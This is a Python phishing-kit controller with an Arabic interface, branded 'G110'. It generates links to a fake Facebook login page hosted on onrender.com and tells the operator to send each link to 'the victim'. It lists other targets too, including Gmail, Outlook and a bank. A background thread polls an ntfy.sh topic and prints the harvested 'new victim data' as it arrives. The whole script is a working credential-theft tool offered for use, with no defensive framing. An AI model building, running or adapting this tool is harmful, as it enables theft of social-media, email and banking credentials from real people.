#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import urllib.request
import urllib.parse
import json
import os
import uuid
import threading
import time
import sys

# ========== الألوان ==========
BLUE = '\033[94m'
SILVER = '\033[90m'
GREEN = '\033[92m'
CYAN = '\033[96m'
BOLD = '\033[1m'
RESET = '\033[0m'
# ============================

CONFIG_FILE = "g110_config.json"

LINKS = {
    1: "https://facebook-vjj9.onrender.com",
    2: "",
    3: "",
    4: "",
    5: "",
    6: "",
    7: "",
    8: "",
    9: "",
    10: ""
}

PLATFORMS = {
    1: "فيسبوك",
    2: "انستغرام",
    3: "تويتر",
    4: "سناب شات",
    5: "تيك توك",
    6: "جيميل",
    7: "ياهو",
    8: "Outlook",
    9: "بنك",
    10: "منصة مخصصة"
}

def clear_screen():
    """مسح الشاشة حسب نظام التشغيل"""
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

def load_or_create_secret():
    """تحميل المفتاح السري أو إنشاؤه"""
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, "r") as f:
            data = json.load(f)
            return data.get("secret", "")
    secret = "G110_" + uuid.uuid4().hex[:12]
    with open(CONFIG_FILE, "w") as f:
        json.dump({"secret": secret}, f)
    return secret

def print_banner():
    """طباعة البانر الجديد باللون الأزرق والفضي"""
    banner = f"""{BLUE}
  _____   __   __    ___  
 / ____| /_ | /_ |  / _ \\ 
| |  __   | |  | | | | | |
| | |_ |  | |  | | | | | |
| |__| |  | |  | | | |_| |
 \\_____|  |_|  |_|  \\___/ 

       \\  G110  /
   ─ مطور الاداة الجنرال ─

       4  7  2  9  1
       8  3  6  0  5
{RESET}"""
    print(banner)

def print_menu():
    """طباعة قائمة المنصات"""
    print(SILVER + "═" * 30 + RESET)
    print(BLUE + BOLD + "      قائمة المنصات" + RESET)
    print(SILVER + "═" * 30 + RESET)
    for n in sorted(PLATFORMS.keys()):
        if LINKS.get(n, "") == "":
            status = SILVER + "(غير مفعل)" + RESET
        else:
            status = GREEN + "(مفعل)" + RESET
        print(f"{BLUE}{n}{RESET} - {CYAN}{PLATFORMS[n]}{RESET} {status}")
    print(SILVER + "══" * 15 + RESET)
    print(f"{BLUE}0{RESET} - {CYAN}خروج{RESET}")

def display_victim_data(message):
    """عرض بيانات الضحية بشكل منظم ومرتب"""
    print("\n" + GREEN + "═" * 40 + RESET)
    print(GREEN + BOLD + "  📩 بيانات ضحية جديدة" + RESET)
    print(GREEN + "═" * 40 + RESET)
    lines = message.strip().split('\n')
    for idx, line in enumerate(lines):
        line = line.strip()
        if not line:
            continue
        if idx == 0 and ("بيانات" in line and "جديدة" in line):
            continue
        if ':' in line:
            key, val = line.split(':', 1)
            key = key.strip()
            val = val.strip()
            print(f"{BLUE}{BOLD}{key}{RESET}: {val}")
        else:
            print(line)
    print(GREEN + "═" * 40 + RESET + "\n")

def listen_ntfy(topic):
    """الاستماع لرسائل ntfy.sh وعرضها منسقة"""
    url = f"https://ntfy.sh/{topic}/json"
    while True:
        try:
            req = urllib.request.Request(url, headers={"Accept": "application/json"})
            with urllib.request.urlopen(req, timeout=300) as response:
                for line in response:
                    if line:
                        try:
                            data = json.loads(line.decode('utf-8'))
                            if 'message' in data:
                                display_victim_data(data['message'])
                        except:
                            pass
        except Exception:
            time.sleep(5)

def main():
    secret = load_or_create_secret()
    clear_screen()
    print_banner()
    print(f"{BLUE}🔑 مفتاحك السري: {CYAN}{secret}{RESET}\n")
    threading.Thread(target=listen_ntfy, args=(secret,), daemon=True).start()
    time.sleep(1)

    while True:
        print_menu()
        choice = input(f"{BLUE}> {RESET}").strip()

        if choice == "0":
            print(f"{GREEN}إيقاف الأداة...{RESET}")
            sys.exit(0)

        if choice.isdigit():
            num = int(choice)
            if num in LINKS:
                if LINKS[num] == "":
                    clear_screen()
                    print_banner()
                    print(f"{SILVER}❌ منصة {PLATFORMS[num]} غير مفعلة بعد.{RESET}")
                    input(f"{BLUE}اضغط Enter للرجوع...{RESET}")
                    clear_screen()
                    print_banner()
                else:
                    link = LINKS[num] + "?topic=" + secret
                    clear_screen()
                    print_banner()
                    print(f"{SILVER}{'═' * 40}{RESET}")
                    print(f"{GREEN}✅ رابط {PLATFORMS[num]}:{RESET}")
                    print(f"{BLUE}{BOLD}{link}{RESET}")
                    print(f"{SILVER}{'═' * 40}{RESET}")
                    print(f"{CYAN}انسخ الرابط وأرسله للضحية.{RESET}")
                    input(f"{BLUE}اضغط Enter للرجوع...{RESET}")
                    clear_screen()
                    print_banner()
            else:
                clear_screen()
                print_banner()
                print(f"{SILVER}رقم غير صحيح{RESET}")
                input(f"{BLUE}اضغط Enter للرجوع...{RESET}")
                clear_screen()
                print_banner()
        else:
            clear_screen()
            print_banner()
            print(f"{SILVER}اختيار غير مفهوم{RESET}")
            input(f"{BLUE}اضغط Enter للرجوع...{RESET}")
            clear_screen()
            print_banner()

if __name__ == "__main__":
    main()